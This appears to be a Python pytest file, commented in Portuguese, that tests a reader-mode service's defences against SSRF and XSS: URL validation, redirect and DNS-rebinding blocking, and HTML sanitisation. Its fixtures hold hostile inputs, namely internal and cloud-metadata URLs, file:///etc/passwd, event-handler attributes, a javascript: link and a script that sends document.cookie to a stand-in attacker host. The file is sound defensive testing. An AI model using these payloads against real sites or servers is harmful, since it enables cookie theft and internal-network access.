"""Modo leitura: as duas guardas e a extracao.

Um "baixe esta URL no servidor" tem dois jeitos classicos de dar errado, e os
dois sao testados aqui porque nenhum aparece em uso normal -- so aparecem no
dia em que alguem tenta.

1. SSRF. A url vem da nossa tabela, mas os recursos nascem de uma busca na
   web: nao sao digitados por nos. Um resultado apontando para 169.254.169.254
   faria o backend buscar, com a credencial de rede DELE, algo que o usuario
   jamais alcancaria.

2. XSS. O HTML vem de terceiro e e renderizado na NOSSA origem. Sem limpar,
   quem controlasse a pagina de origem executaria script no PathR.

Offline: nada aqui vai a rede. A extracao roda sobre HTML escrito no teste.
"""

import pathlib

import pytest

from app.services import reader


# ---------------------------------------------------------------------------
# SSRF
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "http://169.254.169.254/latest/meta-data/",  # metadados da nuvem
        "http://127.0.0.1:8031/health",
        "http://localhost:8031/health",
        "http://10.0.0.5/",
        "http://192.168.1.1/",
        "http://[::1]/",
        "file:///etc/passwd",
        "ftp://exemplo.com/arquivo",
        "gopher://exemplo.com/",
        "http://0.0.0.0/",
    ],
)
def test_endereco_interno_ou_esquema_estranho_e_recusado(url):
    assert reader._url_permitida(url) is False


def test_endereco_publico_e_aceito():
    assert reader._url_permitida("https://git-scm.com/docs/gittutorial") is True


def test_host_que_nao_resolve_e_recusado():
    """Nao resolver e motivo para nao tentar: sem endereco nao ha como
    conferir se e publico."""
    assert reader._url_permitida("https://dominio-que-nao-existe.invalid/x") is False


# ---------------------------------------------------------------------------
# Sanitizacao
# ---------------------------------------------------------------------------

# Um documento REALISTA, e nao um paragrafo solto: o extrator decide o que e
# artigo por densidade de texto, e num HTML minusculo ele achata tudo num
# paragrafo so -- o que faria o teste medir o extrator no seu pior caso em vez
# de no caso que a tela vai encontrar. Em artigo de verdade a estrutura e
# preservada (medido: 80 e 108 blocos <pre> nos artigos da biblioteca).
PAGINA = """
<html><head><title>Guia</title></head><body>
<nav>menu que nao interessa</nav>
<article>
  <h1>Como usar GitHub Actions</h1>
  <p>Passo 1: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 1.</p>
  <p>Passo 2: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 2.</p>
  <p>Passo 3: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 3.</p>
  <p>Passo 4: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 4.</p>
  <p>Passo 5: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 5.</p>
  <p>Passo 6: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 6.</p>
  <p>Passo 7: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 7.</p>
  <p>Passo 8: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 8.</p>
  <p>Passo 9: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 9.</p>
  <p>Passo 10: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 10.</p>
  <p>Passo 11: o workflow do GitHub Actions roda a cada push no repositorio, e cada job declara o ambiente onde executa. Isso mantem o pipeline reproduzivel e evita depender da maquina de quem abriu o pull request numero 11.</p>
  <h2>Escrevendo o primeiro workflow</h2>
  <p>Um workflow roda a cada <strong>push</strong>. Veja
     <a href="/docs/exemplo" onclick="roubar()">o exemplo</a> abaixo, que cobre
     o caso mais comum de integracao continua em projetos pequenos.</p>
  <pre><code>on: push
jobs:
  build:
    runs-on: ubuntu-latest</code></pre>
  <p><img src="/img/fluxo.png" alt="fluxo" onerror="roubar()"> O diagrama acima
     mostra a ordem em que os jobs sao disparados quando ha dependencia entre
     eles declarada com needs.</p>
  <script>fetch('https://mau.exemplo/'+document.cookie)</script>
  <iframe src="https://mau.exemplo/"></iframe>
  <p onmouseover="roubar()" style="display:none">texto com armadilha escondido
     do leitor por css, que e exatamente o que a limpeza precisa remover.</p>
</article>
<footer>rodape</footer>
</body></html>
"""


@pytest.fixture
def leitura(monkeypatch):
    monkeypatch.setattr(reader, "_baixar", lambda url: (PAGINA, url))
    return reader.ler("https://exemplo.com/artigo")


def test_script_e_iframe_nao_sobrevivem(leitura):
    assert "<script" not in leitura.html
    assert "<iframe" not in leitura.html
    assert "document.cookie" not in leitura.html


def test_manipulador_de_evento_e_removido(leitura):
    """`onclick`, `onerror` e `onmouseover` executam sem clique nenhum em
    alguns casos, e rodariam na nossa origem."""
    for atributo in ("onclick", "onerror", "onmouseover"):
        assert atributo not in leitura.html


def test_style_inline_e_removido(leitura):
    """`display:none` num paragrafo esconderia texto do leitor sem que ele
    saiba, e `style` e vetor de ataque por si."""
    assert "style=" not in leitura.html


def test_o_conteudo_do_artigo_permanece(leitura):
    """Limpar nao pode significar esvaziar."""
    assert "GitHub Actions" in leitura.html
    assert "workflow" in leitura.html


def test_bloco_de_codigo_sobrevive(leitura):
    """E o que torna o modo leitura util para artigo tecnico: sem <pre>, o
    yaml vira uma linha corrida e o artigo perde justamente a parte que a
    pessoa foi ler."""
    assert "<pre>" in leitura.html
    assert "runs-on: ubuntu-latest" in leitura.html


def test_titulos_e_links_sobrevivem(leitura):
    assert "<h" in leitura.html
    assert "<a " in leitura.html


def test_conta_as_palavras_do_texto(leitura):
    """A contagem alimenta o "x min de leitura" da tela."""
    assert leitura.palavras > 5


def test_pagina_sem_artigo_extraivel_avisa(monkeypatch):
    monkeypatch.setattr(reader, "_baixar", lambda url: ("<html><body></body></html>", url))
    with pytest.raises(reader.LeituraIndisponivel) as erro:
        reader.ler("https://exemplo.com/vazio")
    assert "extrair" in erro.value.motivo


# ---------------------------------------------------------------------------
# Codigo inline x bloco de codigo
#
# trafilatura devolve TODO trecho de codigo como `<pre>`, sem distinguir os
# dois casos. Como `<pre>` e elemento de bloco, o navegador FECHA o paragrafo
# ao encontra-lo: uma frase com tres nomes de evento no meio chegava a tela
# como cinco pedacos empilhados -- texto, caixa larga, virgula sozinha, caixa,
# ", and". Foi o que se viu nos artigos do freeCodeCamp.
# ---------------------------------------------------------------------------


def test_codigo_no_meio_da_frase_nao_quebra_o_paragrafo():
    bruto = "<p>The <pre>push</pre>, <pre>release</pre>, and <pre>pull_request</pre> events.</p>"
    assert reader._arruma_codigo(bruto) == (
        "<p>The <code>push</code>, <code>release</code>, and "
        "<code>pull_request</code> events.</p>"
    )


def test_bloco_de_codigo_continua_bloco():
    # O bloco de verdade chega ANINHADO, e e assim que se distingue um do outro.
    bruto = "<pre><pre>name: CI\non:\n  push:\n</pre></pre>"
    assert reader._arruma_codigo(bruto) == "<pre><code>name: CI\non:\n  push:\n</code></pre>"


def test_pre_simples_com_varias_linhas_vale_como_bloco():
    """A quebra de linha e a segunda opiniao.

    Errar para o lado do bloco preserva o alinhamento, que num trecho de YAML
    e o conteudo -- transformar isso em codigo inline juntaria tudo numa linha.
    """
    assert reader._arruma_codigo("<pre>uma\nduas</pre>") == "<pre><code>uma\nduas</code></pre>"


def test_texto_sem_codigo_passa_intacto():
    assert reader._arruma_codigo("<p>sem codigo nenhum</p>") == "<p>sem codigo nenhum</p>"


def test_o_marcador_interno_nao_vaza_para_a_tela():
    saida = reader._arruma_codigo("<pre><pre>bloco</pre></pre><p>x <pre>inline</pre></p>")
    assert "pathr-bloco" not in saida
    assert saida == "<pre><code>bloco</code></pre><p>x <code>inline</code></p>"


# ---------------------------------------------------------------------------
# A moldura do site
#
# Reproduz, sem rede, a pagina de documentacao do git-scm.com que chegou a tela
# com o menu de idiomas, o menu "Topics", o historico de versoes com 688
# imagens quebradas, o texto inteiro sublinhado e as opcoes partidas em
# marcadores alternados. Cada teste abaixo e um desses defeitos.
# ---------------------------------------------------------------------------

_PARAGRAFO = (
    "O Git e um sistema de controle de revisao distribuido, rapido e escalavel, com um "
    "conjunto de comandos incomumente rico que oferece operacoes de alto nivel e acesso "
    "completo aos seus recursos internos para quem precisa ir alem do basico. "
)

# O recorte da pagina REAL, e nao um HTML escrito a mao. Escrito a mao, o menu
# ficava pequeno demais e o proprio trafilatura o descartava: tres destes testes
# passavam mesmo com a limpeza desligada -- conferido -- e teste que nao falha
# sem a correcao nao protege nada. Na pagina real, o menu mora dentro do mesmo
# #main que o manual, e e isso que reproduz o defeito.
DOC_GIT = (
    pathlib.Path(__file__).parent / "fixtures" / "git-scm-docs-git-pt_BR.html"
).read_text(encoding="utf-8")

URL_DOC = "https://git-scm.com/docs/git/pt_BR"


@pytest.fixture
def doc_git(monkeypatch):
    monkeypatch.setattr(reader, "_baixar", lambda url: (DOC_GIT, url))
    return reader.ler(URL_DOC).html


def test_menus_do_site_nao_viram_conteudo(doc_git):
    for menu in ("Topics", "Setup and Config", "Plumbing Commands", "Latest version",
                 "2.55.0", "Português (Brasil) ▾"):
        assert menu not in doc_git, menu


def test_o_manual_continua_inteiro(doc_git):
    """Tirar a moldura nao pode levar o texto junto."""
    for trecho in ("RESUMO", "DESCRIÇÃO", "git [-v | --version]", "gittutorial[7]",
                   "GIT_TRACE_PACKFILE", "Permite o monitoramento"):
        assert trecho in doc_git, trecho


def test_nenhuma_imagem_aponta_para_o_pathr(doc_git):
    """Relativa, "/images/x.png" carregaria de pathr.notter.com.br e quebraria."""
    from lxml import html as H

    imagens = [i.get("src") or "" for i in H.fragment_fromstring(doc_git, create_parent="div").iter("img")]
    assert all(src.startswith("https://") for src in imagens), imagens


def test_bolinhas_de_icone_nao_aparecem(doc_git):
    assert "green-dot" not in doc_git and "red-dot" not in doc_git


def test_ancora_de_secao_nao_sobrevive(doc_git):
    """Resolvida contra a raiz do site, "#_resumo" levava o clique para fora
    do artigo. E embrulhava o paragrafo seguinte, sublinhando tudo."""
    assert "#_resumo" not in doc_git
    assert "https://git-scm.com#" not in doc_git


def test_nenhum_link_embrulha_bloco(doc_git):
    """Link com paragrafo, codigo ou lista dentro e aninhamento quebrado, e e
    exatamente o que deixava a documentacao sublinhada de ponta a ponta."""
    from lxml import html as H

    raiz = H.fragment_fromstring(doc_git, create_parent="div")
    blocos = {"p", "pre", "ul", "ol", "li", "div", "h2", "h4", "table", "blockquote"}
    for link in raiz.iter("a"):
        assert not any(d.tag in blocos for d in link.iterdescendants()), H.tostring(link)


def test_link_relativo_do_texto_vira_absoluto(doc_git):
    assert 'href="https://git-scm.com/docs/gittutorial/pt_BR"' in doc_git


def test_opcao_e_explicacao_ficam_juntas(doc_git):
    """<dl> achatado virava marcadores alternados: o nome da opcao num item e
    a explicacao no seguinte. O termo vira subtitulo, a explicacao logo abaixo."""
    from lxml import html as H

    raiz = H.fragment_fromstring(doc_git, create_parent="div")
    titulo = next(
        h for h in raiz.iter("h4") if " ".join(h.itertext()).strip() == "GIT_TRACE_PACKFILE"
    )
    seguinte = titulo.getnext()
    assert seguinte is not None and seguinte.tag != "li"
    assert "Permite o monitoramento" in " ".join(seguinte.itertext())


def test_sinopse_continua_bloco_de_codigo(doc_git):
    """Com include_formatting ligado, a sinopse (que tem <em> dentro) virava
    citacao em italico e perdia o alinhamento. Pego por este teste."""
    resumo = doc_git.split("RESUMO", 1)[1].split("DESCRI", 1)[0]
    assert "<pre><code>" in resumo
    assert "<blockquote>" not in resumo


def test_leitura_carrega_a_versao_do_extrator(doc_git):
    """library.py busca de novo tudo que nao comeca com esta marca -- e o que
    faz a correcao chegar ao que ja estava gravado."""
    assert doc_git.startswith(reader.MARCA_DA_VERSAO)


def test_classe_com_nome_de_menu_nao_leva_o_artigo_inteiro(monkeypatch):
    """Um site que embrulha o ARTIGO numa classe com "sidebar" no nome perderia
    tudo por uma palavra. A protecao do conteudo impede."""
    pagina = f"""<html><body>
      <nav>menu</nav>
      <div class="layout-with-sidebar"><article><h1>Titulo</h1>
        <p>{_PARAGRAFO * 6}</p><p>{_PARAGRAFO * 6}</p></article></div>
    </body></html>"""
    monkeypatch.setattr(reader, "_baixar", lambda url: (pagina, url))
    assert "controle de revisao" in reader.ler("https://exemplo.com/a").html


def test_pagina_que_e_so_indice_de_links_avisa(monkeypatch):
    """Melhor oferecer o original do que mostrar uma lista de links como se
    fosse um artigo."""
    itens = "".join(
        f'<p><a href="/tutorial-{n}">Tutorial completo numero {n} sobre git e github actions</a></p>'
        for n in range(40)
    )
    pagina = f"<html><body><article><h1>Tutoriais</h1>{itens}</article></body></html>"
    monkeypatch.setattr(reader, "_baixar", lambda url: (pagina, url))
    with pytest.raises(reader.LeituraIndisponivel) as erro:
        reader.ler("https://exemplo.com/indice")
    assert "índice" in erro.value.motivo


def test_imagem_preguicosa_usa_o_endereco_de_verdade(monkeypatch):
    pagina = f"""<html><body><article><h1>T</h1><p>{_PARAGRAFO * 5}</p>
      <p><img src="data:image/gif;base64,R0lGOD" data-src="/img/diagrama.png" alt="d"> {_PARAGRAFO}</p>
      <p>{_PARAGRAFO * 5}</p></article></body></html>"""
    monkeypatch.setattr(reader, "_baixar", lambda url: (pagina, url))
    html = reader.ler("https://exemplo.com/post/1").html
    assert "https://exemplo.com/img/diagrama.png" in html
    assert "data:image" not in html


def test_sinonimos_da_mesma_opcao_viram_um_subtitulo(doc_git):
    """`-v` e `--version` sao a mesma opcao. Separados, o primeiro aparecia
    como titulo sem nada embaixo."""
    from lxml import html as H

    titulos = [
        " ".join(" ".join(h.itertext()).split())
        for h in H.fragment_fromstring(doc_git, create_parent="div").iter("h4")
    ]
    assert "-v, --version" in titulos, titulos[:6]
    assert "-v" not in titulos


def test_redirecionamento_para_endereco_interno_e_barrado_antes_de_sair(monkeypatch):
    """Um link público que redireciona para a rede interna não pode chegar a
    ser requisitado: a validação vale para cada salto, e a conexão vai ao IP
    já validado (Host carrega o domínio), então o IP interno é barrado no
    passo de resolução, antes de o segundo pedido sair."""
    import httpx

    from app.services import reader as leitor

    hosts_pedidos = []

    def transporte(pedido: httpx.Request) -> httpx.Response:
        # A URL aponta para o IP fixado; o domínio vem no cabeçalho Host.
        hosts_pedidos.append(pedido.headers.get("host"))
        if pedido.headers.get("host") == "publico.exemplo":
            return httpx.Response(302, headers={"location": "http://169.254.169.254/latest/meta-data/"})
        return httpx.Response(200, text="<html>segredo</html>", headers={"content-type": "text/html"})

    original = httpx.Client

    def cliente(**argumentos):
        return original(transport=httpx.MockTransport(transporte), **argumentos)

    monkeypatch.setattr(leitor.httpx, "Client", cliente)
    # publico.exemplo resolve para um IP público de mentira; o 169.254.169.254 é
    # um IP literal interno e cai na validação real, sem rede.
    real = leitor._resolver_e_validar
    monkeypatch.setattr(
        leitor,
        "_resolver_e_validar",
        lambda host, porta: "93.184.216.34" if host == "publico.exemplo" else real(host, porta),
    )
    monkeypatch.setattr(leitor, "_endereco_publico", lambda host: host == "publico.exemplo")

    import pytest

    with pytest.raises(leitor.LeituraIndisponivel):
        leitor._baixar("https://publico.exemplo/vaga")
    # O metadata nunca foi pedido: só o primeiro salto (publico.exemplo) saiu.
    assert hosts_pedidos == ["publico.exemplo"]


def test_link_javascript_no_artigo_perde_o_href():
    """O HTML do artigo vai para a tela com `dangerouslySetInnerHTML`; o nh3
    precisa tirar esquemas que executam, ou um link do artigo rodaria script."""
    import nh3

    limpo = nh3.clean(
        '<p><a href="javascript:alert(1)">x</a> <a href="https://ok.com">y</a></p>',
        tags=reader._TAGS,
        attributes=reader._ATRIBUTOS,
    )
    assert "javascript" not in limpo
    assert 'href="https://ok.com"' in limpo


def test_dns_rebinding_conexao_usa_a_mesma_resolucao_validada(monkeypatch):
    """Mesmo que a checagem por nome 'passe', a conexão resolve e valida o
    MESMO endereço — um host que resolve para IP interno na hora de conectar é
    barrado antes de qualquer pedido sair (fecha o DNS rebinding)."""
    import httpx

    from app.services import reader as leitor

    # A checagem antiga aceitaria; a resolução real devolve um IP interno.
    monkeypatch.setattr(leitor, "_endereco_publico", lambda host: True)
    monkeypatch.setattr(
        leitor.socket,
        "getaddrinfo",
        lambda host, porta, **k: [(2, 1, 6, "", ("127.0.0.1", porta or 443))],
    )

    pediu = []

    def transporte(pedido: httpx.Request) -> httpx.Response:
        pediu.append(str(pedido.url))
        return httpx.Response(200, text="<html>x</html>", headers={"content-type": "text/html"})

    original = httpx.Client
    monkeypatch.setattr(
        leitor.httpx, "Client", lambda **kw: original(transport=httpx.MockTransport(transporte), **kw)
    )

    import pytest

    with pytest.raises(leitor.LeituraIndisponivel):
        leitor._baixar("https://qualquer.exemplo/x")
    assert pediu == []
